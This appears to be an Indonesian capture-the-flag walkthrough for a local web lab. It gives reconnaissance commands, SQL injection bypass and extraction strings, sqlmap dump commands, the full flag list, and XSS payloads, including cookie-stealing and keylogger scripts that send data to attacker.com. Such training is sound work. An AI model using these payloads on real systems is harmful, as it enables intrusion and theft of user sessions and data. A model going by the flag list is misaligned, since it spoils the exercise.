# 🔍 Mystery Corporation CTF - Complete Solution Guide

## 🎯 Overview
Panduan lengkap untuk menyelesaikan Mystery Corporation CTF dengan semua teknik yang diperlukan.

## 📋 Step-by-Step Solution

### Phase 1: Reconnaissance 🔍

#### 1.1 Port Scanning dengan Nmap
```bash
# Basic port scan
nmap -p- localhost

# Service detection
nmap -sV -p 8080,8081,3306 localhost

# Expected results:
# Port 8080: HTTP (main web application)
# Port 8081: HTTP (hidden service)
# Port 3306: MySQL (database)
```

#### 1.2 Directory Enumeration dengan Gobuster
```bash
# Basic directory scan
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt

# Common directories to find:
# /admin/ (403 Forbidden - requires authentication)
# /backup/ (200 OK - contains database.sql)
# /robots.txt (200 OK - contains hints)
```

#### 1.3 Information Gathering
```bash
# Check robots.txt
curl http://localhost:8080/robots.txt

# Check source code comments
curl http://localhost:8080/ | grep -i "<!--"
```

**Flags Found:**
- `FLAG{hidden_service_discovered_8081}` - Akses http://localhost:8081
- `FLAG{backup_files_exposed_g0bust3r}` - Baca /backup/database.sql

### Phase 2: SQL Injection 💉

#### 2.1 Authentication Bypass
```bash
# Method 1: Default credentials
Username: admin
Password: admin123

# Method 2: SQL Injection
Username: admin' OR '1'='1'-- 
Password: anything

# Method 3: Union-based injection
Username: admin' UNION SELECT 1,'admin','admin123','admin',5-- 
Password: admin123
```

#### 2.2 Database Enumeration via Search
```sql
-- Enumerate tables
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema='mystery_corp'-- 

-- Enumerate columns
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'-- 

-- Extract user data
' UNION SELECT 1,username,password,role,5 FROM users-- 

-- Extract employee data (contains flags)
' UNION SELECT 1,name,department,secret_note,5 FROM employees-- 

-- Extract secrets (requires admin access)
' UNION SELECT 1,title,content,access_level,5 FROM secrets-- 
```

**Flags Found:**
- `FLAG{sql_injection_master_b4d1c0d3}` - Login sebagai admin

### Phase 3: Cross-Site Scripting (XSS) 🚨

#### 3.1 Stored XSS Discovery
```sql
-- Search for XSS payload in employee notes
Search: Alice

-- XSS payload akan muncul di hasil:
<script>alert("FLAG{xss_found_h3r3}")</script>
```

#### 3.2 XSS Exploitation
```javascript
// Payload yang tersimpan di database
<script>alert("FLAG{xss_found_h3r3}")</script>

// Payload untuk testing
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

**Flags Found:**
- `FLAG{xss_found_h3r3}` - Temukan XSS di employee notes

### Phase 4: Privilege Escalation & Admin Access 🔐

#### 4.1 Admin Panel Access
Setelah login sebagai admin, akses:
- `/admin/secrets.php` - Company secrets
- `/admin/vault.php` - Security vault

#### 4.2 Database Manipulation
```sql
-- View all secrets (admin required)
SELECT * FROM secrets WHERE access_level = 3;

-- Check admin users
SELECT * FROM users WHERE role = 'admin';
```

**Flags Found:**
- `FLAG{admin_access_s3cr3t_pr0j3ct}` - Akses admin/secrets.php

### Phase 5: Final Challenge 🏆

#### 5.1 Security Vault Access
Akses `/admin/vault.php` untuk mendapatkan flag terakhir.

**Flags Found:**
- `FLAG{vault_master_mystery_solved_c0mpl3t3}` - Final flag

## 🏁 Complete Flag List

1. **FLAG{hidden_service_discovered_8081}** 
   - **Method**: Nmap scan → akses port 8081
   - **Location**: http://localhost:8081

2. **FLAG{backup_files_exposed_g0bust3r}**
   - **Method**: Gobuster directory enumeration
   - **Location**: /backup/database.sql

3. **FLAG{sql_injection_master_b4d1c0d3}**
   - **Method**: SQL injection login bypass
   - **Location**: Dashboard setelah login admin

4. **FLAG{xss_found_h3r3}**
   - **Method**: Search employee "Alice" 
   - **Location**: Employee notes (XSS payload)

5. **FLAG{admin_access_s3cr3t_pr0j3ct}**
   - **Method**: Admin panel access
   - **Location**: /admin/secrets.php

6. **FLAG{vault_master_mystery_solved_c0mpl3t3}**
   - **Method**: Security vault access
   - **Location**: /admin/vault.php

## 🛠️ Tools & Commands Used

### Reconnaissance
```bash
# Nmap scanning
nmap -p- localhost
nmap -sV -p 8080,8081,3306 localhost

# Directory enumeration
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Manual enumeration
curl http://localhost:8080/robots.txt
curl http://localhost:8080/backup/database.sql
```

### SQL Injection
```bash
# Manual testing
curl -X POST http://localhost:8080/ -d "username=admin' OR '1'='1'-- &password=test&login=Login"

# SQLmap (optional)
sqlmap -u "http://localhost:8080/dashboard.php?search=test" --dbs
sqlmap -u "http://localhost:8080/dashboard.php?search=test" -D mystery_corp --tables
sqlmap -u "http://localhost:8080/dashboard.php?search=test" -D mystery_corp -T users --dump
```

### Web Application Testing
```bash
# Burp Suite
# - Intercept requests
# - Test SQL injection payloads
# - Analyze responses

# Manual testing with curl
curl -X GET "http://localhost:8080/dashboard.php?search=' UNION SELECT 1,2,3,4,5-- "
```

## 🎓 Learning Points

### 1. Reconnaissance adalah Kunci
- Selalu mulai dengan port scanning
- Directory enumeration mengungkap file sensitif
- Information gathering dari source code dan comments

### 2. SQL Injection Techniques
- Authentication bypass dengan OR conditions
- Union-based injection untuk data extraction
- Information schema untuk database enumeration

### 3. XSS Discovery
- Stored XSS lebih berbahaya dari reflected XSS
- Selalu check input fields yang tidak di-sanitize
- XSS bisa digunakan untuk session hijacking

### 4. Privilege Escalation
- Admin access membuka lebih banyak attack surface
- Kombinasi vulnerabilities lebih powerful
- Systematic approach menghasilkan complete compromise

### 5. Methodology
- Follow a systematic approach
- Document semua findings
- Chain exploits untuk maximum impact

## 🔧 Advanced Techniques

### Database Enumeration
```sql
-- Get database version
' UNION SELECT 1,@@version,3,4,5-- 

-- Get current user
' UNION SELECT 1,user(),3,4,5-- 

-- Get all databases
' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- 

-- Get file privileges (if available)
' UNION SELECT 1,file_priv,3,4,5 FROM mysql.user WHERE user='root'-- 
```

### XSS Payloads
```javascript
// Basic alert
<script>alert('XSS')</script>

// Cookie stealing
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){fetch('http://attacker.com/log.php?key='+String.fromCharCode(e.which))}</script>
```

## 🚨 Security Lessons

### Vulnerabilities Found:
1. **SQL Injection** - Input tidak di-sanitize
2. **XSS** - Output tidak di-escape
3. **Information Disclosure** - Backup files exposed
4. **Weak Authentication** - Default credentials
5. **Insufficient Access Control** - Admin functions accessible

### Mitigation Strategies:
1. **Prepared Statements** untuk SQL queries
2. **Input Validation** dan output encoding
3. **Proper File Permissions** dan access controls
4. **Strong Password Policies**
5. **Regular Security Audits**

---

**Congratulations! 🎉**

Anda telah berhasil menyelesaikan Mystery Corporation CTF dan mempelajari berbagai teknik penetration testing yang penting untuk cybersecurity!

*Remember: Use these skills responsibly and only on systems you own or have explicit permission to test.*